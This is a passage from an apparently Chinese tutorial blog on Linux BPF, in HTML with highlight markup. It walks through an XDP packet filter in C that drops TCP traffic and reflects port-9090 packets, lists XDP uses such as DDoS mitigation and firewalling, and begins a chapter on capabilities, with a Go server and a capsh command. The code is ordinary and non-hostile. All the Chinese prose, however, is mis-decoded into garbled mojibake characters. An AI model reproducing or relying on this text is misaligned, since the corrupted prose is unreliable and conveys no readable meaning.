class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">th</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦æœ‰äº†å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°ç›¸åº”é€»è¾‘ã€‚</p><p>ç¬¬ä¸€ä»¶è¦åšçš„äº‹æ˜¯æ£€æŸ¥åè®®æ˜¯å¦ä¸ºTCP <code>ip-&gt;protocol == IPPROTO_TCP</code>ã€‚ å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬æ€»æ˜¯åšä¸€ä¸ª<code>XDP_DROP</code>ï¼› å¦åˆ™ï¼Œå¯¹å…¶ä»–æ‰€æœ‰å†…å®¹æ‰§è¡Œ<code>XDP_PASS</code>ã€‚</p><p>åœ¨æ£€æŸ¥TCPåè®®æ—¶ï¼Œæˆ‘ä»¬åšå¦ä¸€ä¸ªæ§åˆ¶æ¥æ£€æŸ¥ç›®æ ‡ç«¯å£æ˜¯å¦ä¸º9090ï¼Œ<code>th-&gt;dest == htons(9090)</code>; å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬åœ¨ä»¥å¤ªç½‘å±‚æ”¹å˜ç›®çš„MACåœ°å€ï¼Œè¿”å›<code>XDP_TX</code>ï¼Œé€šè¿‡åŒä¸€ä¸ªç½‘å¡åå¼¹æ•°æ®åŒ…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    th = (struct tcphdr *)(ip + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">void</span> *)(th + <span class="number">1</span>) &gt; data_end) &#123;</span><br><span class="line">      <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (th-&gt;dest == htons(<span class="number">9090</span>)) &#123;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">0</span>] = <span class="number">0x08</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">2</span>] = <span class="number">0x27</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">4</span>] = <span class="number">0x38</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">5</span>] = <span class="number">0x2a</span>;</span><br><span class="line">      <span class="keyword">return</span> XDP_TX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>program.c</code>å®Œæ•´ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"kmyprogram"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">th</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    th = (struct tcphdr *)(ip + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">void</span> *)(th + <span class="number">1</span>) &gt; data_end) &#123;</span><br><span class="line">      <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (th-&gt;dest == htons(<span class="number">9090</span>)) &#123;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">0</span>] = <span class="number">0x08</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">2</span>] = <span class="number">0x27</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">4</span>] = <span class="number">0x38</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">5</span>] = <span class="number">0x2a</span>;</span><br><span class="line">      <span class="keyword">return</span> XDP_TX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨å¯ä»¥è¿è¡Œæˆ‘ä»¬çš„æµ‹è¯•ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos prog-test-run]# python3 test_xdp.py</span><br><span class="line">...</span><br><span class="line">    --------------------------------</span><br><span class="line">    Ran 3 tests in 4.676s</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="XDPç”¨ä¾‹"><a href="#XDPç”¨ä¾‹" class="headerlink" title="XDPç”¨ä¾‹"></a>XDPç”¨ä¾‹</h3><h4 id="ç›‘æ§"><a href="#ç›‘æ§" class="headerlink" title="ç›‘æ§"></a>ç›‘æ§</h4><p>ç°åœ¨ï¼Œå¤§å¤šæ•°ç½‘ç»œç›‘æ§ç³»ç»Ÿè¦ä¹ˆé€šè¿‡ç¼–å†™å†…æ ¸æ¨¡å—æ¥å®ç°ï¼Œè¦ä¹ˆé€šè¿‡ä»ç”¨æˆ·ç©ºé—´è®¿é—®<code>proc</code>æ–‡ä»¶æ¥å®ç°ã€‚ ç¼–å†™ã€åˆ†å‘å’Œç¼–è¯‘å†…æ ¸æ¨¡å—å¹¶ä¸æ˜¯æ¯ä¸ªäººçš„ä»»åŠ¡ã€‚ å®ƒä»¬ä¹Ÿä¸å®¹æ˜“ç»´æŠ¤å’Œè°ƒè¯•ã€‚ ç„¶è€Œï¼Œæ›¿ä»£æ–¹æ¡ˆå¯èƒ½æ›´ç³Ÿã€‚ è¦è·å¾—ç›¸åŒç±»å‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä¸€å¼ å¡åœ¨ä¸€ç§’é’Ÿå†…æ”¶åˆ°å¤šå°‘ä¸ªæ•°æ®åŒ…ï¼Œæ‚¨éœ€è¦æ‰“å¼€å¹¶åˆ†å‰²ä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯ <code>/sys/class/net/eth0/statistics/rx_packets</code>ã€‚ è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œä½†å®ƒéœ€è¦å¤§é‡çš„è®¡ç®—æ‰èƒ½è·å¾—ä¸€äº›ç®€å•çš„ä¿¡æ¯ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ä½¿ç”¨å¼€æ”¾ç³»ç»Ÿè°ƒç”¨å¹¶ä¸ä¾¿å®œã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œèƒ½å¤Ÿå®ç°ä¸å†…æ ¸æ¨¡å—ç±»ä¼¼çš„åŠŸèƒ½ï¼Œè€Œä¸ä¼šæŸå¤±æ€§èƒ½ã€‚XDPæ˜¯å®Œç¾çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨XDPç¨‹åºå‘é€æˆ‘ä»¬æƒ³è¦åœ¨æ˜ å°„ä¸­æå–çš„æ•°æ®ã€‚ç„¶åæ˜ å°„è¢«åŠ è½½å™¨ä½¿ç”¨ï¼ŒåŠ è½½å™¨å¯ä»¥å°†æŒ‡æ ‡å­˜å‚¨åˆ°å­˜å‚¨åç«¯å¹¶å¯¹å…¶åº”ç”¨ç®—æ³•æˆ–å°†ç»“æœç»˜åˆ¶åœ¨å›¾ä¸­ã€‚</p><h4 id="ç¼“è§£DDoS"><a href="#ç¼“è§£DDoS" class="headerlink" title="ç¼“è§£DDoS"></a>ç¼“è§£DDoS</h4><p>èƒ½å¤Ÿåœ¨NICçº§åˆ«æŸ¥çœ‹æ•°æ®åŒ…å¯ç¡®ä¿åœ¨ç¬¬ä¸€é˜¶æ®µæ‹¦æˆªä»»ä½•å¯èƒ½çš„æ•°æ®åŒ…ï¼Œæ­¤æ—¶ç³»ç»Ÿå°šæœªèŠ±è´¹è¶³å¤Ÿçš„è®¡ç®—èƒ½åŠ›æ¥äº†è§£æ•°æ®åŒ…æ˜¯å¦å¯¹ç³»ç»Ÿæœ‰ç”¨ã€‚åœ¨å…¸å‹çš„åœºæ™¯ä¸­ï¼Œ<code>bpf map</code>å¯ä»¥æŒ‡ç¤ºXDPç¨‹åºä»æŸä¸ªæº<code>XDP_DROP</code>æ•°æ®åŒ…ã€‚åœ¨åˆ†æé€šè¿‡å¦ä¸€ä¸ªæ˜ å°„æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ä¹‹åï¼Œå¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´ä¸­ç”Ÿæˆè¯¥æ•°æ®åŒ…åˆ—è¡¨ã€‚ä¸€æ—¦æµå…¥XDPç¨‹åºçš„æ•°æ®åŒ…ä¸åˆ—è¡¨ä¸­çš„å…ƒç´ åŒ¹é…ï¼Œå°±ä¼šå‘ç”Ÿç¼“è§£ã€‚ æ•°æ®åŒ…è¢«ä¸¢å¼ƒï¼Œå†…æ ¸ç”šè‡³ä¸éœ€è¦èŠ±è´¹ä¸€ä¸ªCPUå‘¨æœŸæ¥å¤„ç†å®ƒã€‚è¿™å¯¼è‡´æ”»å‡»è€…çš„ç›®æ ‡éš¾ä»¥å®ç°ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ— æ³•æµªè´¹ä»»ä½•æ˜‚è´µçš„è®¡ç®—èµ„æºã€‚</p><h4 id="è´Ÿè½½å‡è¡¡"><a href="#è´Ÿè½½å‡è¡¡" class="headerlink" title="è´Ÿè½½å‡è¡¡"></a>è´Ÿè½½å‡è¡¡</h4><p>XDPç¨‹åºçš„ä¸€ä¸ªæœ‰è¶£ç”¨ä¾‹æ˜¯è´Ÿè½½å¹³è¡¡ã€‚ ä½†æ˜¯ï¼ŒXDPåªèƒ½åœ¨æ•°æ®åŒ…åˆ°è¾¾çš„åŒä¸€ä¸ªNICä¸Šé‡æ–°ä¼ è¾“æ•°æ®åŒ…ã€‚è¿™æ„å‘³ç€XDPä¸æ˜¯å®ç°ç»å…¸è´Ÿè½½å‡è¡¡å™¨çš„æœ€ä½³é€‰æ‹©ï¼Œè¯¥è´Ÿè½½å‡è¡¡å™¨ä½äºæ‰€æœ‰æœåŠ¡å™¨ä¹‹å‰å¹¶å°†æµé‡è½¬å‘ç»™å®ƒä»¬ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ„å‘³ç€XDPä¸é€‚åˆè¿™ä¸ªç”¨ä¾‹ã€‚ å¦‚æœæˆ‘ä»¬å°†è´Ÿè½½å¹³è¡¡ä»å¤–éƒ¨æœåŠ¡å™¨è½¬ç§»åˆ°ä¸ºåº”ç”¨ç¨‹åºæä¾›æœåŠ¡çš„åŒä¸€å°æœºå™¨ä¸Šï¼Œåˆ™å¯ä»¥çœ‹åˆ°NICæ˜¯å¦‚ä½•å®Œæˆè¿™é¡¹å·¥ä½œã€‚</p><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªåˆ†å¸ƒå¼è´Ÿè½½å‡è¡¡å™¨ï¼Œå…¶ä¸­æ¯å°æ‰˜ç®¡åº”ç”¨ç¨‹åºçš„æœºå™¨éƒ½æœ‰åŠ©äºå°†æµé‡åˆ†æ•£åˆ°é€‚å½“çš„æœåŠ¡å™¨ã€‚</p><h4 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h4><p>å½“äººä»¬æƒ³åˆ°Linuxä¸Šçš„é˜²ç«å¢™æ—¶ï¼Œé€šå¸¸ä¼šæƒ³åˆ°<code>iptables</code>æˆ–ç½‘ç»œè¿‡æ»¤å™¨ã€‚ ä½¿ç”¨XDPå¯ä»¥ç›´æ¥åœ¨NICæˆ–å…¶é©±åŠ¨ç¨‹åºä¸­ä»¥å®Œå…¨å¯ç¼–ç¨‹çš„æ–¹å¼è·å¾—ç›¸åŒçš„åŠŸèƒ½ã€‚é€šå¸¸ï¼Œé˜²ç«å¢™æ˜¯ä½äºç½‘ç»œå †æ ˆé¡¶éƒ¨æˆ–èŠ‚ç‚¹ä¹‹é—´çš„æ˜‚è´µæœºå™¨ï¼Œç”¨äºæ§åˆ¶å…¶é€šä¿¡ã€‚ç„¶è€Œï¼Œå½“ä½¿ç”¨XDPæ—¶ï¼Œå› ä¸ºXDPç¨‹åºéå¸¸ä¾¿å®œå’Œå¿«é€Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†é˜²ç«å¢™é€»è¾‘ç›´æ¥å®ç°åˆ°èŠ‚ç‚¹çš„NICä¸­ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¸€ç»„ä¸“ç”¨æœºå™¨ã€‚ä¸€ä¸ªå¸¸è§çš„ç”¨ä¾‹æ˜¯æœ‰ä¸€ä¸ªXDPåŠ è½½å™¨æ¥æ§åˆ¶ä¸€ä¸ªæ˜ å°„ï¼Œå…¶ä¸­åŒ…å«ä¸€ç»„é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨APIæ›´æ”¹çš„è§„åˆ™ã€‚ ç„¶åï¼Œæ˜ å°„ä¸­çš„ä¸€ç»„è§„åˆ™ä¼šåŠ¨æ€åœ°ä¼ é€’ç»™åŠ è½½åˆ°æ¯å°ç‰¹å®šæœºå™¨ä¸­çš„XDPç¨‹åºï¼Œä»¥æ§åˆ¶å®ƒå¯ä»¥æ¥æ”¶ä»€ä¹ˆã€ä»è°ä»¥åŠåœ¨ä»€ä¹ˆæƒ…å†µä¸‹æ¥æ”¶ã€‚</p><p>è¿™ç§æ›¿ä»£æ–¹æ¡ˆä¸ä»…é™ä½äº†é˜²ç«å¢™æˆæœ¬ï¼› å®ƒè¿˜å…è®¸æ¯ä¸ªèŠ‚ç‚¹éƒ¨ç½²è‡ªå·±çš„é˜²ç«å¢™çº§åˆ«ï¼Œè€Œæ— éœ€ä¾èµ–ç”¨æˆ·ç©ºé—´è½¯ä»¶æˆ–å†…æ ¸æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚å½“ä½¿ç”¨<code>offloaded</code>çš„XDPä½œä¸ºæ“ä½œæ¨¡å¼è¿›è¡Œéƒ¨ç½²æ—¶ä¼šæœ‰æ›´å¤§ä¼˜åŠ¿ï¼Œå› ä¸ºå¤„ç†ç”šè‡³ä¸éœ€è¦ä¸»èŠ‚ç‚¹CPUå®Œæˆã€‚</p><h3 id="ç»“è®º-2"><a href="#ç»“è®º-2" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>ä»ç°åœ¨å¼€å§‹ï¼ŒXDPå°†å¸®åŠ©ä½ ä»¥ä¸€ç§å®Œå…¨ä¸åŒçš„æ–¹å¼æ€è€ƒç½‘ç»œæµã€‚å¤„ç†ç½‘ç»œæ•°æ®åŒ…æ—¶ä¸å¾—ä¸ä¾èµ–<code>iptables</code>æˆ–å…¶ä»–ç”¨æˆ·ç©ºé—´å·¥å…·ç­‰å·¥å…·ä»¤äººæ²®ä¸§ã€‚XDPåˆ™å¾ˆæœ‰è¶£ï¼Œå› ä¸ºå®ƒå…·æœ‰ç›´æ¥çš„æ•°æ®åŒ…å¤„ç†èƒ½åŠ›ï¼Œå› æ­¤é€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”ä½ å¯ä»¥ç¼–å†™è‡ªå·±çš„é€»è¾‘æ¥å¤„ç†ç½‘ç»œæ•°æ®åŒ…ã€‚å› ä¸ºæ‰€æœ‰è¿™äº›ä»£ç éƒ½å¯ä»¥ä¸æ˜ å°„ä¸€èµ·ä½¿ç”¨å¹¶ä¸å…¶ä»–BPFç¨‹åºäº¤äº’ã€‚</p><h2 id="ç¬¬å…«ç« èŠ‚"><a href="#ç¬¬å…«ç« èŠ‚" class="headerlink" title="ç¬¬å…«ç« èŠ‚"></a>ç¬¬å…«ç« èŠ‚</h2><h3 id="Linuxå†…æ ¸Securityã€Capabilitieså’ŒSeccomp"><a href="#Linuxå†…æ ¸Securityã€Capabilitieså’ŒSeccomp" class="headerlink" title="Linuxå†…æ ¸Securityã€Capabilitieså’ŒSeccomp"></a>Linuxå†…æ ¸Securityã€Capabilitieså’ŒSeccomp</h3><p>BPFæ˜¯ä¸€ç§åœ¨ä¸å½±å“ç¨³å®šæ€§ã€å®‰å…¨æ€§å’Œé€Ÿåº¦çš„æƒ…å†µä¸‹æ‰©å±•å†…æ ¸çš„å¼ºå¤§æ–¹æ³•ã€‚å‡ºäºè¿™ä¸ªåŸå› ï¼Œå†…æ ¸å¼€å‘äººå‘˜è®¤ä¸ºï¼Œé€šè¿‡å®ç°ç”±BPF ç¨‹åºï¼ˆä¹Ÿç§°ä¸º Seccomp BPFï¼‰æ”¯æŒçš„<code>Seccomp</code>è¿‡æ»¤å™¨ï¼Œåˆ©ç”¨å…¶å¤šåŠŸèƒ½æ€§æ¥æ”¹å–„ <code>Seccomp</code>ä¸­çš„è¿›ç¨‹éš”ç¦»ä¼šæ˜¯ä¸€ä»¶å¥½äº‹ã€‚åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†ç ”ç©¶<code>Seccomp</code>æ˜¯ä»€ä¹ˆä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒã€‚ ç„¶åä½ ä¼šå­¦ä¹ å¦‚ä½•ä½¿ç”¨BPFç¨‹åºç¼–å†™<code>Seccomp</code>è¿‡æ»¤å™¨ã€‚ æœ€åå°†æ¢ç´¢å†…æ ¸ä¸ºLinuxå®‰å…¨æ¨¡å—æä¾›çš„å†…ç½®BPFæŒ‚é’©ã€‚</p><p>Linuxå®‰å…¨æ¨¡å— (LSM) æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸€ç»„åŠŸèƒ½ï¼Œå¯ç”¨äºä»¥æ ‡å‡†åŒ–æ–¹å¼å®ç°ä¸åŒçš„å®‰å…¨æ¨¡å‹ã€‚LSMå¯ä»¥ç›´æ¥åœ¨å†…æ ¸æºä»£ç æ ‘ä¸­ä½¿ç”¨ï¼Œä¾‹å¦‚<code>Apparmorã€SELinuxå’ŒTomoyo</code></p><h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>LinuxåŠŸèƒ½çš„å¤„ç†æ˜¯ä½ éœ€è¦ä¸ºéç‰¹æƒè¿›ç¨‹æä¾›æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„æƒé™ï¼Œä½†ä½ ä¸æƒ³å°†<code>suid</code>æƒé™æˆäºˆäºŒè¿›åˆ¶æ–‡ä»¶æˆ–ä»¥å…¶ä»–æ–¹å¼ä½¿è¿›ç¨‹å…·æœ‰ç‰¹æƒï¼Œå› æ­¤åªéœ€é€šè¿‡å‡å°‘æ”»å‡»é¢èµ‹äºˆæµç¨‹å®Œæˆç‰¹å®šä»»åŠ¡çš„ç‰¹å®šèƒ½åŠ›ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ çš„åº”ç”¨ç¨‹åºéœ€è¦æ‰“å¼€ä¸€ä¸ªç‰¹æƒç«¯å£ï¼Œæ¯”å¦‚ 80ï¼Œè€Œä¸æ˜¯ä»¥rootèº«ä»½å¯åŠ¨è¿›ç¨‹ï¼Œä½ å¯ä»¥ç»™å®ƒ<code>CAP_NET_BIND_SERVICE</code>èƒ½åŠ›ã€‚</p><p>è€ƒè™‘å¦‚ä¸‹<code>main.go</code>ç¨‹åº</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">  <span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">"%v"</span>, http.ListenAndServe(<span class="string">":80"</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥ç¨‹åºåœ¨ç«¯å£80ï¼ˆä¸€ä¸ªç‰¹æƒç«¯å£ï¼‰ä¸Šä¸ºHTTPserveræä¾›æœåŠ¡ã€‚</p><p>æˆ‘ä»¬é€šå¸¸ä¼šåšçš„æ˜¯åœ¨ä½¿ç”¨ä»¥ä¸‹ä»£ç ç¼–è¯‘åç›´æ¥è¿è¡Œè¯¥ç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[elssm@VM-16-14-centos ~]$ go build -o capabilities main.go</span><br><span class="line">[elssm@VM-16-14-centos ~]$ ./capabilities</span><br><span class="line">2022/06/03 17:44:46 listen tcp :80: bind: permission denied</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰æˆäºˆrootæƒé™ï¼Œå› æ­¤ç»‘å®šç«¯å£æ—¶è¯¥ä»£ç ä¼šè¾“å‡ºé”™è¯¯ï¼š</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…è®¸<code>cap_net_bind_service</code>åŠŸèƒ½ä»¥åŠç¨‹åºå·²ç»æ‹¥æœ‰çš„æ‰€æœ‰å…¶ä»–åŠŸèƒ½æ¥å…è®¸ç‰¹æƒç«¯å£çš„ç»‘å®šï¼Œè€Œä¸æ˜¯ç»™äºˆå®Œå…¨çš„rootæƒé™ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>capsh</code>åŒ…è£…æˆ‘ä»¬çš„ç¨‹åºè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# capsh --caps='cap_net_bind_service+eip cap_setpcap,cap_setuid,cap_setgid+ep' --keep=1 --user="nobody" --addamb=cap_net_bind_service -- -c "./capabilities"</span><br></pre></td></tr></table></figure><p>capshï¼šä½¿ç”¨capshä½œä¸ºè£…é¥°å™¨</p><p>â€”caps=â€™cap_net_bind_service+eip cap_setpcap,cap_setuid,cap_setgid+epâ€™ï¼šå› ä¸ºæˆ‘ä»¬éœ€è¦æ›´æ”¹ç”¨æˆ·ï¼ˆæˆ‘ä»¬ä¸æƒ³ä»¥rootèº«ä»½è¿è¡Œï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŒ‡å®š<code>cap_net_bind_service</code>ä»¥åŠå®é™…å°†ç”¨æˆ·IDä»root æ›´æ”¹ä¸ºnobodyçš„èƒ½åŠ›ï¼Œå³<code>cap_setuid</code>å’Œ<code>cap_setgid</code>ï¼š</p><p>â€”keep=1ï¼šå½“ä»rootåˆ‡æ¢å®Œæˆæ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›ä¿ç•™è®¾ç½®çš„åŠŸèƒ½</p><p>â€”user=â€™nobodyâ€™ï¼šè¿è¡Œæˆ‘ä»¬ç¨‹åºçš„æœ€ç»ˆç”¨æˆ·å°†æ˜¯ä»»ä½•äºº</p><p>â€”addamb=cap_net_bind_serviceï¼šæˆ‘ä»¬è®¾ç½®äº†ç¯å¢ƒåŠŸèƒ½ï¼Œå› ä¸ºè¿™äº›åŠŸèƒ½åœ¨ä»rootåˆ‡æ¢åä¼šè¢«æ¸…é™¤ã€‚</p><p>â€” -c â€œ./capabilitiesâ€ï¼šä¸€åˆ‡å°±ç»ªï¼Œè¿è¡Œç¨‹åº</p><p>æ­¤æ—¶ä½ å¯èƒ½ä¼šé—®åœ¨<code>--caps</code>é€‰é¡¹ä¸­çš„åŠŸèƒ½ä¹‹åçš„<code>+eip</code>æ˜¯ä»€ä¹ˆï¼š</p><ul><li>éœ€è¦æ¿€æ´»è¯¥åŠŸèƒ½(p)</li><li>è¯¥èƒ½åŠ›æ˜¯å¯ç”¨çš„(e)</li><li>è¯¥èƒ½åŠ›å¯ä»¥ç”±å­è¿›ç¨‹ç»§æ‰¿(i)</li></ul><p>å› ä¸ºæˆ‘ä»¬è¦ä½¿ç”¨æˆ‘ä»¬çš„<code>cap_net_bind_service</code>ï¼Œæ‰€ä»¥éœ€è¦å°†å®ƒè®¾ä¸ºeï¼› ç„¶ååœ¨æˆ‘ä»¬çš„å‘½ä»¤ä¸­å¯åŠ¨äº†ä¸€ä¸ª shellã€‚å¯åŠ¨äº†<code>capabilities</code>äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®ä¸ºiã€‚ 